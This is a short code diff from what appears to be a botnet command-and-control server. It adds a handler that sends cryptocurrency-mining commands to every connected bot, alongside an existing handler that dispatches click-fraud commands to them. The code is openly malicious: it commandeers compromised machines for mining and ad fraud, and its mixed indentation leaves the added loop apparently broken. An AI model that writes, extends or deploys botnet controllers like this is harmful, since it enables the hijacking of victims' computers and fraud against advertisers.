@@ -75,6 +75,11 @@ class SlaveDriver(basic.LineReceiver):
                 
         if cmd == 'BITCOIN':
         	print("This feature isn't fully implemented, should work but highly insecure and slow")
+        	for key,val in self.slaves.iteritems():
+        		output = 'Starting BITCOIN MINING for bot {0}\n'.format(key)
+                self.transport.write(output)
+                botcmd = str(self.count) + " " + line
+                self.kserver.set(val,botcmd)
        	if cmd == 'CLICKFRAUD':
        		for key,val in self.slaves.iteritems():
        			output = 'Starting CLICKFRAUD for bot {0}\n'.format(key)
